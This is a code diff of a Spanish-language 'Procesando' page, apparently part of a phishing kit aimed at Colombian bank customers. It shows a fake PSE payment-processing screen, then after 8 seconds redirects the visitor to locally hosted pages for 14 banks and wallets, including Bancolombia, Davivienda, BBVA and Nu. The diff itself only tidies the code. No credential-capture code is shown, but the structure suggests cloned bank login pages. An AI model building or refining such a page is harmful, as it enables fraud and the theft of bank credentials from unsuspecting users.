@@ -6,109 +6,100 @@
 <title>Procesando</title>
 
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: Arial, sans-serif;
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial;
 }
 
-body {
-    background: #ffffff;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
+body{
+background:#fff;
+height:100vh;
+display:flex;
+flex-direction:column;
+justify-content:space-between;
 }
 
-/* LOGO ARRIBA */
-.header {
-    text-align: center;
-    padding-top: 20px;
+.header{
+text-align:center;
+padding-top:20px;
 }
 
-.header img {
-    width: 160px;
+.header img{
+width:160px;
 }
 
-/* CENTRO */
-.center {
-    text-align: center;
+.center{
+text-align:center;
 }
 
-/* GIF */
-.center img {
-    width: 180px;
-    margin-bottom: 20px;
+.center img{
+width:180px;
+margin-bottom:20px;
 }
 
-/* TEXTO */
-.text {
-    font-size: 16px;
-    color: #200020;
-    padding: 0 30px;
-    line-height: 1.4;
+.text{
+font-size:16px;
+color:#200020;
+padding:0 30px;
+line-height:1.4;
 }
 
-/* ESPACIO ABAJO */
-.footer {
-    height: 40px;
+.footer{
+height:40px;
 }
 </style>
 </head>
 
 <body>
 
-<!-- LOGO -->
 <div class="header">
-    <img src="logo2.svg" alt="logo">
+<img src="logo2.svg">
 </div>
 
-<!-- CENTRO -->
 <div class="center">
-    <img src="procesando.gif" alt="cargando">
+<img src="procesando.gif">
 
-    <div class="text">
-        Estamos procesando tu solicitud con PSE.<br>
-        Esto puede tardar unos segundos...
-    </div>
+<div class="text">
+Estamos procesando tu solicitud con PSE.<br>
+Esto puede tardar unos segundos...
+</div>
 </div>
 
 <div class="footer"></div>
 
 <script>
+const banco = localStorage.getItem("banco");
+
+if (!banco) {
+window.location.href = "index.html";
+}
+
+const rutas = {
+"BANCO DAVIVIENDA":"Banco/Davivienda/index.html",
+"BANCO DE BOGOTA":"Banco/Bogota/index.html",
+"BANCO POPULAR":"Banco/Popular/index.html",
+"BANCO BBVA COLOMBIA S.A.":"Banco/BBVA/index.html",
+"BANCO AV VILLAS":"Banco/AvVillas/index.html",
+"BANCO DE OCCIDENTE":"Banco/Occidente/index.html",
+"BANCO FALABELLA":"Banco/Falabella/index.html",
+"BANCO GNB SUDAMERIS":"Banco/Gnb/index.html",
+"BANCO ITAU":"Banco/Itau/index.html",
+"DAVIPLATA":"Banco/Daviplata/index.html",
+"BANCOLOMBIA":"Banco/Bancolombia/index.html",
+"GLOBAL66":"Banco/Global66/index.html",
+"BANCO CAJA SOCIAL":"Banco/Social/index.html",
+"NU":"Banco/Nu/index.html"
+};
+
 setTimeout(() => {
 
-    let banco = localStorage.getItem("banco");
-
-    if (!banco) {
-        window.location.href = "index.html";
-        return;
-    }
-
-    const rutas = {
-        "BANCO DAVIVIENDA": "Banco/Davivienda/index.html",
-        "BANCO DE BOGOTA": "Banco/Bogota/index.html",
-        "BANCO POPULAR": "Banco/Popular/index.html",
-        "BANCO BBVA COLOMBIA S.A.": "Banco/BBVA/index.html",
-        "BANCO AV VILLAS": "Banco/AvVillas/index.html",
-        "BANCO DE OCCIDENTE": "Banco/Occidente/index.html",
-        "BANCO FALABELLA": "Banco/Falabella/index.html",
-        "BANCO GNB SUDAMERIS": "Banco/Gnb/index.html",
-        "BANCO ITAU": "Banco/Itau/index.html",
-        "DAVIPLATA": "Banco/Daviplata/index.html",
-        "BANCOLOMBIA": "Banco/Bancolombia/index.html",
-        "GLOBAL66": "Banco/Global66/index.html",
-        "BANCO CAJA SOCIAL": "Banco/Social/index.html",
-        "NU": "Banco/Nu/index.html"
-    };
-
-    if (rutas[banco]) {
-        window.location.href = rutas[banco];
-    } else {
-        alert("Banco no configurado: " + banco);
-        window.location.href = "index.html";
-    }
+if (rutas[banco]) {
+window.location.href = rutas[banco];
+} else {
+window.location.href = "index.html";
+}
 
 }, 8000);
 </script>
